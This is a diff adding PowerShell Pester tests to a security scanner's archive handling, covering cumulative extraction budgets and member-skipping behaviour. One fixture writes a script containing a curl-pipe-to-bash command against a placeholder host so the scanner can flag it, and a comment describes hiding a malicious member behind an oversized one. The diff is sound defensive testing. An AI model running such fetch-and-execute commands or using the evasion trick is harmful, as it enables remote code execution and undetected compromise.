@@ -977,3 +977,122 @@ Describe 'Invoke-Scan — staging root survives an 8.3 short-name $env:TEMP (rev
         }
     }
 }
+
+Describe 'Invoke-Scan — cumulative budget for top-level semantic containers (review follow-up 5, #6)' {
+    It 'blocks a later top-level wheel once earlier ones have used up the semantic-container budget, without starving the first' {
+        # The BUG: a top-level semantic container (wheel/egg/.nupkg) always
+        # extracts regardless of the shared archive-tree budget -- by design,
+        # since blocking it because an UNRELATED earlier generic archive used
+        # up the budget would silently break Python/NuGet coverage (review
+        # follow-up 2, #4). But with NO bound on this category at all, many
+        # top-level wheels/eggs/.nupkg files -- each individually allowed up
+        # to the 512MB per-archive decompression-bomb cap -- could
+        # cumulatively exhaust disk with no run-wide limit.
+        $tmpDir = Join-Path $env:TEMP "mts-p8r1-$(Get-Random)"
+        New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
+        $out = Join-Path $env:TEMP "mts-p8r1-out-$(Get-Random)"
+        $wheelSrc = Join-Path $script:Corpus 'python/clean_pkg-1.0-py3-none-any.whl'
+        Copy-Item -LiteralPath $wheelSrc -Destination (Join-Path $tmpDir 'pkg_a.whl')
+        Copy-Item -LiteralPath $wheelSrc -Destination (Join-Path $tmpDir 'pkg_b.whl')
+
+        $estimate = Get-ArchiveExpansionEstimate -Path (Join-Path $tmpDir 'pkg_a.whl')
+        $estimate | Should -Not -BeNullOrEmpty
+        $origMaxBytes = $script:ArchiveTreeMaxBytes
+        try {
+            # Room for ONE wheel's estimated expansion, not two.
+            $script:ArchiveTreeMaxBytes = $estimate.Bytes + 50
+            $r = Invoke-Scan -Path $tmpDir -Profile core -AnalyzerDir $script:Analyzers `
+                -ReportsDir $out -Mode offline
+
+            $pkgUnits = @($r.Units | Where-Object { $_.Name -like 'pkg_*.whl' })
+            $pkgUnits.Count | Should -Be 2
+
+            $blockedUnits = @($pkgUnits | Where-Object {
+                @($_.Findings | Where-Object {
+                    $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' -and $_.Issue -match 'semantic-container budget' }).Count -gt 0
+            })
+            # Exactly one of the two hits the cumulative cap -- proves the
+            # bound is enforced -- but never both, since the FIRST admitted
+            # one must never be starved by this new gate on its own.
+            $blockedUnits.Count | Should -Be 1
+            $notBlockedUnits = @($pkgUnits | Where-Object { $_ -notin $blockedUnits })
+            $notBlockedUnits.Count | Should -Be 1
+        } finally {
+            $script:ArchiveTreeMaxBytes = $origMaxBytes
+            Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
+            Remove-Item $out -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    It 'still extracts a top-level wheel when the shared archive-tree budget starts fully exhausted (no regression)' {
+        # Decisive proof the NEW cumulative semantic-container gate is
+        # genuinely SEPARATE from the shared archive-tree $budget: the
+        # existing guarantee (review follow-up 2, #4) that an unrelated
+        # exhausted budget must never starve Python/NuGet coverage must still
+        # hold exactly as before.
+        $origMaxBytes   = $script:ArchiveTreeMaxBytes
+        $origMaxMembers = $script:ArchiveTreeMaxMembers
+        $out = Join-Path $env:TEMP "mts-p8r1b-out-$(Get-Random)"
+        try {
+            $script:ArchiveTreeMaxBytes   = 0
+            $script:ArchiveTreeMaxMembers = 0
+            $r = Invoke-Scan -Path (Join-Path $script:Corpus 'python') -Profile core `
+                -AnalyzerDir $script:Analyzers -ReportsDir $out -Mode offline
+
+            $u = $r.Units | Where-Object { $_.Name -eq 'clean_pkg-1.0-py3-none-any.whl' }
+            $u | Should -Not -BeNullOrEmpty
+            @($u.Findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' }).Count | Should -Be 0
+        } finally {
+            $script:ArchiveTreeMaxBytes   = $origMaxBytes
+            $script:ArchiveTreeMaxMembers = $origMaxMembers
+            Remove-Item $out -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
+
+Describe 'Archive-member dispatch — an oversized member does not block a later smaller one (review follow-up 5, #7)' {
+    It 'continues past a member that does not individually fit and still analyzes a later smaller one' {
+        # The BUG: hitting the byte cap on ONE member's own size used to
+        # `break` out of the ENTIRE remaining loop, treating every member
+        # after it as skipped too -- even a much smaller one that would
+        # easily have fit within the remaining headroom on its own. An
+        # attacker could place one oversized benign member right before a
+        # small malicious script to keep that script from ever being
+        # analyzed while budget remained.
+        $stage = Join-Path $env:TEMP "mts-p8r2-$(Get-Random)"
+        $workDir = Join-Path $env:TEMP "mts-p8r2-work-$(Get-Random)"
+        New-Item -ItemType Directory -Path $stage -Force | Out-Null
+        New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+        try {
+            [System.IO.File]::WriteAllBytes((Join-Path $stage 'big.bin'), [byte[]]::new(500))
+            [System.IO.File]::WriteAllText((Join-Path $stage 'small.sh'),
+                "#!/bin/bash`ncurl https://example.test/install.sh | bash`n")
+
+            $context = [PSCustomObject]@{
+                Tools = @{}; Venv = $null; Mode = 'offline'; WorkDir = $workDir
+                ReportsDir = $script:Out; HelperDir = ''; TimeoutSeconds = 60; AdvisoryDbDate = $null
+            }
+            $enabled = @((Import-AnalyzerRegistry -AnalyzerDir $script:Analyzers) | Where-Object { $_.DefaultEnabled })
+            $unit = [PSCustomObject]@{ Type = 'archive'; Name = 'container.zip'; Path = 'container.zip'
+                                        RelativePath = 'container.zip'; StagingPath = $stage }
+            $budget = New-ArchiveTreeBudget
+            $budget.MaxBytes = 100   # big.bin (500) alone exceeds this; small.sh's own bytes easily fit
+
+            $findings = Invoke-ArchiveMemberDispatch -ArchiveUnit $unit -Context $context `
+                -Enabled $enabled -Budget $budget -Depth 1
+
+            # big.bin was skipped (too big on its own) -- named in the gap note.
+            $gap = @($findings | Where-Object { $_.TestID -eq 'MTS-ARCHIVE-BUDGET-EXCEEDED' })
+            $gap.Count | Should -Be 1
+            $gap[0].Issue | Should -Match 'big\.bin'
+            # small.sh was STILL analyzed and flagged -- the loop did not stop
+            # at big.bin; only that one oversized member was skipped.
+            @($findings | Where-Object {
+                $_.TestID -eq 'SHELL-REMOTE-EXEC' -and $_.File -eq 'container.zip!small.sh' }).Count |
+                Should -BeGreaterThan 0
+        } finally {
+            Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
+            Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
